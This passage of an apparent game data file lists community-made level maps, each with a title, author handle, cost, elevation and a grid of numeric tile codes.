7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,2,2,88,0,0,0,0,0,0,0,0]});
maps.push({name="Aepp Nano Grid 1",author="ZpLit",id="#1674527303",direction="forward",cost=154,elevation=5,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,3,3,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,21,21,0,12,12,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,95,95,0,0,13,13,0,0,0,0,0,0,0,0,0,0,14,0,0,0,21,21,0,0,0,14,0,0,0,0,0,0,0,0,0,0,14,0,189,0,21,21,0,189,0,14,0,0,0,0,0,0,0,0,187,18,92,0,16,150,9998,9998,150,16,0,92,18,186,0,0,0,0,0,0,0,0,14,0,0,0,21,21,0,0,0,14,0,0,0,0,0,0,0,0,0,0,14,0,0,0,21,21,0,0,0,14,0,0,0,0,0,0,0,0,0,0,14,0,189,0,21,21,0,189,0,14,0,0,0,0,0,0,0,0,187,18,92,0,16,150,9998,9998,150,16,0,92,18,186,0,0,0,0,0,0,0,0,14,0,0,0,21,21,0,0,0,14,0,0,0,0,0,0,0,0,0,0,14,0,0,0,21,21,0,0,0,14,0,0,0,0,0,0,0,0,0,0,14,0,189,0,21,21,0,189,0,14,0,0,0,0,0,0,0,0,187,18,92,0,16,150,9998,9998,150,16,0,92,18,186,0,0,0,0,0,0,0,0,14,0,0,0,21,21,0,0,0,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,88,2,2,88,14,14,14,0,0,0,0,0]});
maps.push({name="Aepp Nano Grid 2",author="ZpLit",id="#1674528626",direction="forward",cost=116,elevation=5,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,3,3,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,18,18,0,12,12,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,18,18,0,0,13,13,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,187,19,14,0,0,0,148,148,0,0,0,14,19,186,0,0,0,0,0,0,0,0,14,0,0,187,19,19,186,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,187,20,14,0,0,0,148,148,0,0,0,14,20,186,0,0,0,0,0,0,0,0,14,0,0,187,20,20,186,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,187,21,14,0,0,0,148,148,0,0,0,14,21,186,0,0,0,0,0,0,0,0,14,0,0,187,21,21,186,0,0,14,0,0,0,0,0,0,0,0,0,0,14,1,1,1,21,21,1,1,1,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,88,2,2,88,14,14,14,0,0,0,0,0]});
maps.push({name="Gacha RNG",author="NyaaaDoge",id="#1674636219",direction="forward",cost=284,elevation=0,map=[0,0,0,0,0,1,1,1,1,0,0,0,0,0,14,2,2,90,0,0,0,0,0,0,7,65,94,119,93,89,24,0,0,0,14,14,14,14,0,0,0,0,0,0,7,1,1,1,199,1,24,24,0,0,14,90,14,14,0,0,0,0,0,0,7,65,94,119,93,89,24,24,67,0,14,14,14,90,0,0,0,0,0,0,7,1,1,1,199,1,90,24,67,0,14,14,14,14,0,0,0,0,0,0,7,65,94,119,93,89,24,24,23,0,14,14,14,14,0,0,0,0,0,0,7,1,1,1,199,1,97,24,22,0,90,14,14,90,0,0,0,0,0,0,7,65,94,119,93,85,24,24,21,0,14,14,14,14,0,0,0,0,0,0,7,1,1,1,199,1,97,24,20,15,14,14,14,14,0,0,131,10,9,8,7,65,94,119,93,85,24,132,19,16,14,14,14,14,0,0,0,0,0,0,7,1,1,1,199,1,97,24,18,17,14,14,14,90,0,0,0,0,0,0,7,65,94,119,93,85,24,24,67,0,14,14,14,14,0,0,0,0,0,0,7,1,1,1,199,1,97,24,67,0,90,14,14,14,0,0,0,0,0,0,7,65,94,119,93,89,24,24,0,0,0,14,14,0,0,0,0,0,0,0,7,1,1,1,199,1,24,24,0,0,0,14,14,0,0,0,0,0,0,0,7,65,94,119,93,89,24,24,0,0,0,95,95,0,0,0,0,0,0,0,7,1,1,1,199,1,90,24,0,0,1,91,91,1,0,0,0,0,0,0,7,65,94,119,93,89,24,0,0,0,1,96,96,1,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,1,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0]});
maps.push({name="Castle Defender",author="NyaaaDoge",id="#1674647299",direction="forward",cost=282,elevation=0,map=[0,0,0,0,0,0,0,0,9,2,2,9,0,0,0,0,0,0,0,0,0,0,0,0,131,94,9,9,9,9,9,9,9,9,94,131,0,0,0,0,0,0,0,0,0,0,4,0,9,9,9,9,0,4,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,9,9,0,0,14,0,0,0,0,0,0,31,31,31,0,0,0,127,0,0,9,9,0,0,127,0,0,0,31,31,31,31,132,31,0,0,0,0,0,0,9,9,0,0,0,0,0,0,31,132,31,31,31,31,0,0,0,0,0,0,9,9,0,0,0,0,0,0,31,31,31,0,32,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,32,0,0,33,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,33,0,0,34,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,34,0,0,0,35,0,0,0,37,0,0,9,9,0,0,37,0,0,0,35,0,0,0,0,0,36,37,0,38,0,0,9,9,0,0,38,0,37,36,0,0,0,0,0,0,67,67,141,67,67,0,9,9,0,67,67,141,67,67,0,0,0,0,0,1,59,59,1,59,59,1,195,195,1,59,59,1,59,59,1,0,0,0,0,59,90,57,97,57,97,57,109,109,57,97,57,97,57,90,59,0,0,0,0,59,57,54,53,52,51,50,49,49,50,51,52,53,54,57,59,0,0,0,67,1,97,55,49,96,49,90,49,49,49,49,96,49,55,97,1,67,0,0,0,59,57,56,96,93,96,97,49,49,97,96,100,96,56,57,59,0,0,0,0,59,97,57,96,100,96,49,49,49,90,96,93,96,57,97,59,0,0,0,0,1,93,57,49,96,49,49,2,2,49,49,96,49,57,93,1,0,0]});
maps.push({name="prEss E to triggEr",author="NyaaaDoge",id="#1674647361",direction="forward",cost=374,elevation=6,map=[0,0,0,0,14,14,14,2,2,14,14,94,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,65,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,96,96,0,1,15,15,15,15,15,15,15,15,197,197,197,15,15,15,15,0,14,14,0,1,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,14,14,0,1,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,14,14,0,98,15,15,15,15,94,1,1,1,54,54,1,1,1,94,15,0,14,14,15,98,16,16,15,15,1,99,99,90,97,97,90,99,99,1,15,0,0,14,15,98,16,16,15,15,1,102,102,14,102,102,14,102,102,1,15,0,0,0,0,98,17,17,15,15,1,90,14,90,14,14,90,14,90,1,15,0,0,0,0,98,17,17,15,15,54,102,102,14,102,102,14,102,102,54,15,0,0,0,0,40,96,96,40,15,54,104,104,14,104,104,14,104,104,54,15,0,0,0,0,40,18,18,40,15,1,90,14,89,14,14,89,14,90,1,15,0,0,0,0,40,19,19,40,15,1,104,104,14,104,104,14,104,104,1,15,0,0,0,0,98,98,98,98,15,1,104,104,88,104,104,87,104,104,1,15,0,0,0,0,20,20,20,20,0,88,1,1,1,54,54,1,1,1,87,15,0,0,0,0,20,101,101,20,0,15,198,15,40,40,40,40,15,15,15,15,0,0,0,0,101,2,2,101,0,15,198,15,40,93,93,40,15,15,15,15,0]});
maps.push({name="EPicker N Edgerunner",author="NyaaaDoge",id="#1674717408",direction="right",cost=250,elevation=0,map=[0,0,0,0,9,2,2,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,9,9,0,0,77,0,0,0,0,0,0,0,1,9,131,0,1,1,9,0,91,91,1,1,1,1,1,0,0,0,0,1,90,97,9,1,112,93,199,9,91,91,39,39,0,39,39,0,40,40,40,9,9,93,9,0,1,1,9,0,49,49,39,76,0,76,76,0,76,76,40,9,90,93,9,0,0,0,0,0,49,49,39,39,0,39,39,0,40,76,40,1,9,97,9,0,0,0,0,0,49,49,0,0,0,0,0,0,40,76,40,0,1,90,131,0,0,0,0,0,49,49,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,49,49,0,0,0,0,0,0,40,76,40,0,0,0,0,0,0,0,0,0,90,49,0,0,0,0,0,0,40,40,40,0,0,0,0,0,0,0,0,0,49,49,0,0,0,0,0,77,13,93,13,77,0,0,0,0,0,0,0,0,49,49,0,0,0,0,0,5,76,76,76,5,0,0,0,0,0,0,0,0,49,49,0,0,0,0,0,3,5,76,5,3,0,0,0,9,9,9,96,0,49,49,49,49,49,9,9,9,9,9,9,9,91,91,91,90,132,9,96,9,49,90,49,49,49,9,9,9,9,9,9,91,91,91,2,9,9,9,96,0,49,49,49,49,90,9,9,9,90,9,91,91,91,91,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Start it Finish it",author="EverReaper",id="#1674717999",direction="left",cost=223,elevation=0,map=[0,25,25,0,25,0,25,0,25,0,25,0,25,0,0,0,0,2,2,0,0,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,25,25,1,1,1,0,0,0,0,0,0,0,0,0,0,0,5,5,0,1,0,37,50,42,1,43,43,0,0,0,0,25,1,195,195,5,5,5,0,1,45,44,44,49,1,88,43,0,0,0,0,0,1,5,5,195,5,5,0,1,38,44,44,41,1,131,43,43,0,43,0,25,0,97,5,195,5,5,0,1,46,44,44,48,1,88,43,0,0,0,0,0,1,5,5,195,5,5,0,1,39,44,44,40,1,43,43,0,0,43,0,0,1,195,195,5,5,5,0,1,0,40,47,0,1,0,0,0,0,0,0,0,0,0,0,0,5,5,0,1,1,24,24,1,1,0,0,0,0,0,43,0,43,0,0,0,96,96,0,0,0,43,43,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,43,43,0,43,0,43,0,0,0,0,0,0,0,43,0,5,5,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,5,65,65,5,0,0,43,0,0,0,0,0,0,0,43,0,5,5,0,0,5,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,5,65,65,5,0,0,43,0,43,0,43,0,43,0,43,0,5,5,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,2,5,5,132,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Wtach out",author="EverReaper",id="#1674718678",direction="forward",cost=400,elevation=0,map=[5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,0,2,2,0,100,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,5,1,5,1,85,1,5,1,5,1,5,1,5,1,5,1,5,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,5,100,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,85,1,5,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,5,5,5,85,5,5,5,5,5,100,5,5,5,85,5,5,5,5,5,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,5,1,85,1,5,1,5,1,85,1,5,1,5,1,85,1,5,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,5,5,5,5,5,5,5,5,5,85,5,5,5,5,5,5,5,5,5,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,5,1,0,2,2,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,100,5]});
maps.push({name="Smoetinhg ssupiicuos",author="EverReaper",id="#1674719589",direction="left",cost=362,elevation=0,map=[0,0,10,10,10,10,10,10,10,10,10,10,0,0,0,2,2,0,0,0,0,0,10,45,45,45,45,45,45,45,45,45,10,10,10,45,45,10,10,10,0,0,10,45,45,45,45,45,45,45,45,45,10,45,45,45,45,45,45,10,0,0,10,45,45,45,195,195,195,45,45,45,10,45,45,45,45,45,45,10,2,45,45,45,45,195,45,45,45,195,45,45,10,45,45,45,45,10,45,10,2,45,45,45,45,195,45,97,45,195,45,45,10,45,10,45,45,10,88,10,0,0,10,45,45,195,45,45,45,195,45,45,10,45,10,45,45,10,10,10,0,0,10,45,45,45,195,195,195,45,45,45,10,45,10,45,45,88,10,0,0,0,10,45,45,45,45,45,45,45,45,45,10,45,10,10,10,10,10,0,0,0,10,45,45,45,45,45,45,45,45,45,10,45,45,45,45,10,0,0,0,0,10,10,10,10,10,10,10,45,10,10,10,10,10,45,45,10,0,0,0,0,10,45,45,45,45,45,45,45,10,0,0,0,10,45,45,10,0,0,0,0,10,45,10,10,10,10,10,10,10,10,10,10,10,45,45,10,10,10,0,0,10,45,10,45,45,45,45,45,45,10,10,45,45,45,45,45,45,10,0,0,10,45,10,45,10,10,10,45,45,10,10,45,10,45,45,10,45,10,0,0,10,45,10,45,10,88,45,45,45,45,45,45,45,10,10,45,45,10,0,0,10,45,10,45,10,88,45,45,45,45,45,45,45,10,10,45,45,10,0,0,10,45,10,45,10,10,10,10,10,10,10,45,10,45,45,10,45,10,0,0,10,45,45,45,10,0,0,0,0,0,10,45,45,45,45,45,45,10,0,0,10,10,10,10,10,0,0,0,0,0,10,10,10,10,10,10,10,10]});
maps.push({name="Team Work",author="EverReaper",id="#1674720618",direction="left",cost=219,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,95,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,97,95,5,5,0,0,0,0,0,0,0,0,0,0,0,30,95,30,0,5,95,5,5,5,0,0,0,0,0,0,0,0,0,0,0,95,99,95,0,0,0,0,5,5,0,0,0,0,0,0,0,36,95,36,0,30,95,30,0,195,195,5,5,5,0,131,42,42,42,0,0,95,102,95,0,30,30,30,0,195,195,5,5,5,0,42,42,42,42,0,0,36,95,36,0,196,196,30,0,0,0,0,5,5,0,42,93,93,42,0,0,36,36,36,0,196,196,30,0,0,0,0,5,5,0,131,93,42,42,42,0,197,197,36,0,0,0,0,0,0,0,0,5,5,0,131,93,42,42,42,0,197,197,36,0,0,0,0,0,0,0,0,5,5,0,42,93,93,42,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,42,42,42,42,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,131,42,42,42,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,96,5,5,5,0,2,5,5,5,132,5,5,5,5,5,5,5,5,5,5,96,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Sorry Luff Doom3",author="EverReaper",id="#1674723352",direction="left",cost=294,elevation=0,map=[1,1,1,1,1,1,1,1,1,0,0,0,0,0,2,2,0,0,0,0,1,131,45,45,45,45,45,45,1,0,0,0,0,1,45,45,1,0,0,0,1,131,45,45,45,45,45,45,1,1,1,1,1,1,45,45,1,1,1,0,1,1,1,1,1,1,45,45,1,45,45,45,45,45,45,45,45,45,1,0,0,0,0,0,0,1,45,45,96,45,45,45,45,45,45,45,45,99,1,0,1,1,1,1,1,1,45,45,96,45,45,1,1,1,1,1,1,1,1,0,1,45,45,45,45,45,45,45,1,45,45,1,0,0,0,0,0,0,0,0,1,45,45,45,45,45,45,45,1,45,45,1,0,0,0,0,0,0,0,0,1,45,45,1,1,1,98,98,1,45,45,1,0,0,0,0,0,0,0,0,1,45,45,1,93,45,45,45,1,45,45,1,0,0,0,0,0,0,0,0,1,45,45,1,97,45,45,45,1,45,45,1,0,0,0,0,0,0,0,0,1,45,45,1,1,1,1,1,1,45,45,1,0,0,0,0,0,0,0,0,1,45,45,45,45,45,45,45,45,45,45,1,0,0,0,0,0,0,0,0,1,45,45,45,45,45,45,45,45,45,45,1,0,0,76,76,76,0,0,0,1,1,1,1,1,1,1,1,1,45,45,1,0,76,0,0,0,76,0,0,0,146,146,146,146,0,0,0,1,45,45,1,0,76,0,0,0,0,76,0,1,1,1,1,1,0,0,0,1,1,1,1,0,0,76,0,0,0,0,76,2,45,45,132,1,0,0,0,0,0,0,0,0,76,0,0,0,0,76,0,2,45,45,45,1,0,0,0,0,0,0,0,0,76,0,0,0,76,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,76,76,76,0,0,0]});
maps.push({name="teamwork",author="alli",id="#1674729268",direction="forward",cost=272,elevation=0,map=[0,0,2,2,1,199,199,199,199,1,1,1,1,1,1,1,1,1,0,0,0,0,5,5,1,93,93,93,120,131,120,93,93,93,120,17,131,17,1,0,23,90,45,45,1,120,120,120,120,120,120,120,120,120,100,9998,17,17,1,0,30,0,5,5,1,120,120,120,120,120,120,120,120,120,120,17,17,17,1,0,30,0,5,5,1,1,9998,1,1,1,1,1,9998,1,1,0,174,0,1,0,24,90,45,45,1,0,198,104,0,0,0,104,198,0,0,0,171,0,1,0,30,0,5,5,1,0,15,15,0,0,0,15,15,0,0,0,0,0,1,0,30,0,5,5,1,0,15,188,0,0,0,188,15,0,0,0,0,0,1,0,23,90,45,45,1,0,15,0,0,0,0,0,15,0,0,0,0,0,1,0,30,0,5,5,1,0,197,99,0,0,0,102,197,0,0,0,0,0,1,0,30,0,5,5,1,0,10,10,0,0,0,10,10,0,0,0,0,0,1,0,24,90,45,45,1,0,10,188,0,0,0,188,10,0,0,0,0,0,1,0,30,0,5,5,1,0,10,0,0,0,0,0,10,0,0,0,0,0,1,0,30,0,5,5,1,0,195,0,0,0,0,97,196,0,0,0,0,0,1,0,23,90,45,45,1,0,5,0,0,0,0,5,5,0,0,0,0,0,1,0,30,0,5,5,1,0,5,0,0,0,0,188,5,0,0,0,168,0,1,0,30,0,5,5,1,0,5,0,0,0,0,0,5,0,0,0,173,0,1,0,24,90,45,45,105,5,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,0,5,5,105,132,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,0,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0]});
maps.push({name="long jumper",author="alli",id="#1674730784",direction="forward",cost=184,elevation=3,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,65,5,9998,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,65,65,5,7,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,90,5,5,90,8,1,0,0,0,0,0,0,1,0,175,0,33,113,113,113,12,11,10,9,9,1,0,0,0,0,0,0,1,187,13,189,33,113,113,113,1,1,1,1,1,0,0,0,0,0,0,0,1,169,173,13,0,33,113,113,1,0,0,0,0,0,0,0,0,0,0,1,124,0,174,13,0,0,33,113,112,1,0,0,0,0,0,0,0,0,0,1,65,67,172,188,0,0,0,32,112,112,1,0,0,0,0,0,0,0,0,1,65,67,0,0,0,0,0,0,31,112,112,1,0,0,0,0,0,0,0,1,124,0,0,0,0,0,0,0,0,31,111,111,1,0,0,0,0,0,0,0,1,67,67,67,0,0,0,0,0,0,30,110,111,1,0,0,0,0,0,0,1,65,65,65,5,0,0,0,0,0,0,30,110,1,0,0,0,0,0,0,1,11,11,11,9998,0,0,0,0,0,0,29,110,1,0,0,0,0,0,0,1,93,93,11,6,9998,0,0,0,0,28,109,109,1,0,0,0,0,0,0,1,93,93,11,11,7,0,0,0,28,108,108,1,0,0,0,0,0,0,0,0,1,1,94,94,9998,8,8,8,108,108,1,0,0,0,0,0,0,0,0,0,0,0,1,1,8,2,2,8,1,1,0,0,0]});
maps.push({name="Speedy Slide",author="sivi",id="#1674737929",direction="forward",cost=434,elevation=0,map=[0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,24,2,2,0,0,1,1,14,14,14,14,1,1,1,1,22,134,22,1,0,24,24,24,0,1,1,14,14,135,135,14,14,1,1,1,24,135,24,1,0,24,24,24,1,1,14,14,135,14,14,135,14,14,1,1,24,135,24,1,0,24,90,24,1,14,14,135,14,14,14,14,135,14,14,1,24,135,24,1,0,24,24,24,1,14,135,14,14,1,1,14,14,135,14,1,24,135,24,1,0,24,24,24,1,14,135,14,1,1,1,1,14,135,14,1,24,135,24,1,0,24,24,24,1,14,135,14,14,1,1,14,14,135,14,1,24,135,24,1,0,24,90,24,1,14,14,135,14,1,1,14,135,14,14,1,24,135,24,1,0,24,24,24,1,1,14,135,14,1,1,14,135,14,1,1,0,0,0,1,0,24,24,24,1,14,14,135,14,1,1,14,135,14,14,1,131,131,131,1,0,24,24,24,1,14,135,14,14,1,1,14,14,135,14,1,17,17,17,1,189,24,90,24,1,14,135,14,1,1,1,1,14,135,14,1,22,22,22,199,122,24,24,24,1,14,135,14,14,1,1,14,14,135,14,1,93,93,93,199,122,24,24,24,1,14,14,135,14,1,1,14,135,14,1,1,1,1,1,1,188,24,24,24,1,1,0,0,0,1,1,65,65,65,65,5,90,0,0,0,0,24,90,24,0,1,131,131,131,1,1,65,65,65,65,5,5,0,0,0,24,24,24,24,0,1,5,5,5,1,1,65,65,65,65,5,131,0,0,0,128,24,132,24,0,1,65,65,65,1,1,65,65,65,65,5,5,0,0,0,24,24,24,24,0,1,8,133,8,1,1,5,94,94,5,5,90,0,0,0,0,24,2,2]});
maps.push({name="1500",author="fantasy",id="#1674742090",direction="right",cost=282,elevation=-6,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,24,100,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,0,0,24,24,1,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,1,0,0,0,0,0,0,0,0,94,24,24,24,24,24,24,24,24,24,24,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,1,67,67,67,67,67,67,0,0,22,22,22,22,22,22,0,22,22,22,22,18,18,96,18,18,18,67,0,0,22,22,1,1,22,22,0,22,22,22,22,18,18,1,1,18,18,1,0,0,22,22,0,1,22,22,0,0,1,22,22,18,18,1,0,18,18,1,0,0,22,22,0,1,22,22,0,0,0,22,22,18,18,1,0,18,18,1,0,0,22,22,0,1,22,22,22,22,22,22,22,18,18,1,0,18,18,1,0,0,97,22,0,1,22,22,22,22,22,22,22,18,18,1,0,18,18,1,0,0,20,20,20,20,20,20,20,20,20,20,20,18,18,1,0,18,18,1,0,0,20,20,20,20,20,20,20,20,20,20,20,18,18,1,0,18,18,1,0,0,20,1,1,1,1,1,1,1,1,1,20,18,18,1,0,18,18,1,0,0,20,1,0,0,0,0,0,0,0,0,20,18,18,1,0,18,18,1,0,0,20,20,20,20,20,20,20,20,20,20,20,18,18,1,0,18,18,2,0,0,93,20,20,20,20,20,20,20,20,20,20,93,18,96,18,18,18,2,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Paint link image",author="Luffaren",id="#1675187939",direction="right",cost=267,elevation=5,map=[0,0,9,2,2,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,29,29,29,29,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,30,30,0,0,0,0,0,0,0,93,14,14,14,14,14,0,0,0,31,31,31,31,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,32,32,32,32,0,0,0,0,0,0,0,14,14,14,14,14,2,0,0,0,33,33,33,33,0,0,0,0,0,0,0,14,14,14,14,14,2,0,0,0,34,34,34,34,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,34,34,34,34,0,0,0,0,0,0,0,93,14,14,14,14,14,0,0,1,34,34,34,34,1,0,0,0,0,0,0,0,0,0,14,14,14,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,1,1,1,95,1,0,67,161,65,65,65,14,14,14,14,14,14,0,0,0,1,89,114,114,1,0,67,161,65,65,65,14,14,14,14,14,14,0,0,0,1,114,114,114,1,0,67,161,65,65,65,65,65,65,14,14,14,14,14,90,1,114,114,114,1,0,67,161,65,65,65,65,65,65,14,14,14,14,14,14,95,114,114,114,1,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,95,114,114,89,1,0,0,14,14,14,14,14,14,14,14,14,14,14,14,90,1,1,1,1,1]});
maps.push({name="KZ behind the fall",author="NyaaaDoge",id="#1675236592",direction="right",cost=183,elevation=-5,map=[1,14,2,2,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,0,0,31,0,0,32,0,0,0,0,0,0,0,0,0,7,14,14,1,0,0,0,0,0,0,0,0,0,33,0,0,0,0,0,0,94,14,14,0,67,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,14,14,0,67,44,30,0,0,0,0,0,0,0,0,0,0,0,0,0,6,13,13,0,67,24,30,36,42,0,0,0,0,0,34,0,0,0,0,0,6,13,13,0,0,44,40,0,32,0,0,0,0,0,0,0,0,0,0,0,6,12,12,0,0,24,34,43,38,0,0,0,0,0,0,0,0,0,0,0,6,12,12,0,0,44,0,0,0,0,0,0,0,0,35,0,0,0,0,0,6,11,11,0,0,61,0,0,0,0,44,93,44,0,0,0,0,0,0,0,6,11,11,0,0,44,0,0,0,0,44,100,44,3,0,0,0,0,0,0,6,10,10,0,0,61,0,0,0,0,44,44,44,0,36,0,0,0,0,0,6,10,10,0,0,43,61,44,61,44,121,122,121,1,118,1,1,0,0,0,7,9,9,0,0,0,0,0,0,0,0,39,0,77,77,77,0,1,1,0,7,9,9,0,154,153,9,88,9,0,0,34,0,0,0,0,1,109,109,0,7,9,85,9,9,9,9,9,9,9,9,9,9,109,109,109,109,109,2,0,7,9,9,9,9,9,9,9,9,9,9,9,9,109,109,109,109,109,2,0,7,7,7,7,7,7,9,9,9,0,0,0,0,0,0,0,0,109,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
